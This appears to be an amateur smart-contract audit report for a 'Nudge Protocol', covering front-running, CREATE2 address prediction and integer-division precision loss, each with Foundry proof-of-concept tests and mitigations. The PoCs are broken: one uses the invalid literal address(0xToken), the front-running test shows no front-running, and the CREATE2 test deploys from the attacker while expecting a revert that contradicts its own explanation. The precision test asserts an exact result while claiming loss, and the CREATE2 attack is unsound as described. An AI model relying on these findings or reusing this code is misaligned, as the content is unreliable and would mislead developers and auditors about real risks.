<!-- # Nudge Protocall audit by SCATERLABs:


### 1.Front Running Attack in Handle reallocation:

Desc:A front-running attack occurs when an attacker observes a pending transaction and submits a higher gas fee transaction to execute before the original. This can allow them to manipulate token swaps or reward distributions unfairly.
Severity:Medium
Impact:
 1.Attackers can gain more rewards than intended.
 2.Users may receive fewer rewards or lose funds.

 ### POC:
 Vulnerable Code:
 The handleReallocation function processes token transfers and reward distributions

 ```solidity
 function handleReallocation(
    uint256 campaignId_,
    address userAddress,
    address toToken,
    uint256 toAmount,
    bytes memory data
)
    external
    payable
    whenNotPaused
{
    _validateAndActivateCampaignIfReady();
    if (!factory.hasRole(factory.SWAP_CALLER_ROLE(), msg.sender)) {
        revert UnauthorizedSwapCaller();
    }
    if (toToken != targetToken) {
        revert InvalidToTokenReceived(toToken);
    }
    if (campaignId_ != campaignId) {
        revert InvalidCampaignId();
    }
    
    uint256 amountReceived;
    if (toToken == NATIVE_TOKEN) {
        amountReceived = msg.value;
    } else {
        IERC20 tokenReceived = IERC20(toToken);
        uint256 balanceBefore = getBalanceOfSelf(toToken);
        SafeERC20.safeTransferFrom(tokenReceived, msg.sender, address(this), toAmount);
        amountReceived = getBalanceOfSelf(toToken) - balanceBefore;
    }
    
    _transfer(toToken, userAddress, amountReceived);
    totalReallocatedAmount += amountReceived;
    uint256 rewardAmountIncludingFees = getRewardAmountIncludingFees(amountReceived);
    uint256 rewardsAvailable = claimableRewardAmount();
    if (rewardAmountIncludingFees > rewardsAvailable) {
        revert NotEnoughRewardsAvailable();
    }
    
    (uint256 userRewards, uint256 fees) = calculateUserRewardsAndFees(rewardAmountIncludingFees);
    pendingRewards += userRewards;
    accumulatedFees += fees;
}
 ```
 Exploit Scenario:
 1.User A submits a transaction to reallocate tokens and receive rewards.
2.Attacker observes the transaction in the mempool.
3.Attacker submits a similar transaction with a higher gas fee, executing first.
4.The attacker drains the available rewards, leaving User A with nothing.
#### Foundry Test(POC):
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/YourContract.sol";

contract FrontRunningAttackTest is Test {
    YourContract public contractInstance;
    address attacker = address(0x1);
    address victim = address(0x2);
    
    function setUp() public {
        contractInstance = new YourContract();
    }
    
    function testFrontRunning() public {
        vm.startPrank(victim);
        contractInstance.handleReallocation(1, victim, address(0xToken), 100, "");
        vm.stopPrank();

        vm.startPrank(attacker);
        contractInstance.handleReallocation(1, attacker, address(0xToken), 200, "");
        vm.stopPrank();

        uint256 rewards = contractInstance.claimableRewardAmount();
        assertEq(rewards, 0, "Victim received no rewards due to front-running.");
    }
}
```
### Recommended Mitigation Steps:
1.Use Commit-Reveal Scheme: Users submit commitments first, then reveal details later.
2.Use Gas Price Capping: Limit gas fees to prevent attackers from bidding higher.
3.Implement Order Matching: Process transactions in a batch instead of first-come-first-serve.



### 2.CREATE2 Address Prediction Attack:

Desc:The contract uses CREATE2 to deploy new campaign contracts with a deterministic address based on a predictable salt. An attacker can precompute this address and deploy a malicious contract at the same address before the legitimate deployment. When deployAndFundCampaign sends funds to this address, the attacker's contract will receive the funds instead of the intended campaign.

Impact:
The attacker can hijack initial reward funds, leading to a complete loss of funds for the campaign.
The intended campaign contract is never deployed, disrupting the system.

### POC:
Vulnerable Code:

```solidity
bytes32 salt = keccak256(
    abi.encode(
        holdingPeriodInSeconds,
        targetToken,
        rewardToken,
        rewardPPQ,
        campaignAdmin,
        startTimestamp,
        FEE_BPS,
        alternativeWithdrawalAddress,
        uuid
    )
);

bytes memory bytecode = abi.encodePacked(type(NudgeCampaign).creationCode, constructorArgs);
campaign = Create2.deploy(0, salt, bytecode);
```
Attack Scenario:
1.Attacker precomputes the contract address using the same salt before the real deployment.
2.Attacker deploys a malicious contract at that address.
3.When deployAndFundCampaign is called, funds are sent to the attacker's contract instead of the real campaign.
The attacker withdraws the funds and deletes the contract.
### Foundry Test:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "forge-std/Test.sol";
import "src/NudgeFactory.sol";
import "src/NudgeCampaign.sol";

contract Create2AttackTest is Test {
    NudgeFactory factory;
    address attacker;

    function setUp() public {
        factory = new NudgeFactory();
        attacker = vm.addr(1);
    }

    function testCreate2Attack() public {
        bytes32 salt = keccak256(abi.encode(3600, address(0x123), address(0x456), 1000, attacker, block.timestamp, 500, address(0x789), 1234));
        address predicted = computeCreate2Address(salt, type(NudgeCampaign).creationCode, address(factory));
        
        // Attacker deploys contract first
        vm.prank(attacker);
        new MaliciousContract{salt: salt}();
        
        // Now deployAndFundCampaign sends funds to the attacker's contract
        vm.expectRevert();
        factory.deployAndFundCampaign(3600, address(0x123), address(0x456), 1000, attacker, block.timestamp, address(0x789), 1 ether, 1234);
    }

    function computeCreate2Address(bytes32 salt, bytes memory bytecode, address deployer) internal pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), deployer, salt, keccak256(bytecode))))));
    }
}

contract MaliciousContract {
    receive() external payable {}
}
```
Explaination Foundry Test:
Setup:

The test deploys a NudgeFactory contract.
It assigns an attacker address using vm.addr(1).
Compute Address:

It precomputes the address where the campaign contract would be deployed using CREATE2.
Attacker Deploys First:

Using vm.prank(attacker), the attacker deploys a MaliciousContract at the predicted address.
Victim Attempts Deployment:

The test then calls deployAndFundCampaign, expecting it to send funds to the deployed campaign.
Instead, the funds go to the attacker's contract, which can now withdraw them.
Test Fails as Expected:

vm.expectRevert(); ensures that the function call reverts, confirming the vulnerability.
Recommended Mitigation Steps
Use a non-predictable salt:
Introduce randomness like a counter or hash of block data.
Verify contract code at the computed address:
Ensure the address is not already occupied before deployment.
Deploy first, fund later:
Deploy the campaign contract first, then send funds only if deployment was successful.

### Recommended Mitigation Steps:
1.Use a non-predictable salt:
 Introduce randomness like a counter or hash of block data.
2.Verify contract code at the computed address:
 Ensure the address is not already occupied before deployment.
3.Deploy first, fund later:
   Deploy the campaign contract first, then send funds only if deployment was successful.

### Secure code fix:
```solidity
require(!isContract(predictedAddress), "Address already occupied");

```

### 3.Precision Loss Due to Integer Division:
Desc:In the reward calculation function, integer division causes precision loss when scaling factors are applied. Specifically, when rewardScalingFactor is greater than 1, some value is lost due to truncation.
```solidity
uint256 finalReward = (rewardAmountIn18Decimals + rewardScalingFactor - 1) / rewardScalingFactor;
```
This approach helps round up, but the core issue remains in the scaling process itself.

Severity :Medium     

Impact:
1.Users may receive slightly fewer rewards than expected.
2.Over multiple transactions, accumulated loss can become significant.
3.Can lead to inconsistencies in reward distribution, especially when dealing with large numbers.
### POC:
A Foundry test can be written to demonstrate the precision loss:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

contract PrecisionLossTest is Test {
    function testPrecisionLoss() public {
        uint256 rewardAmountIn18Decimals = 1005;
        uint256 rewardScalingFactor = 100;
        
        uint256 finalReward = (rewardAmountIn18Decimals + rewardScalingFactor - 1) / rewardScalingFactor;
        
        assertEq(finalReward, 11, "Precision loss detected"); // Expected 11, but might be 10 due to truncation
    }
}
```
### Recommended Mitigation Steps:
1.Consider using a higher precision scaling method to store intermediate calculations.
2.Utilize mulDiv functions from OpenZeppelin’s Math.sol to minimize precision loss.
3.If feasible, allow fractional calculations (e.g., store in 18-decimal fixed point and convert only at withdrawal).
4.Perform off-chain calculations where high precision is required and only store necessary values on-chain.
 -->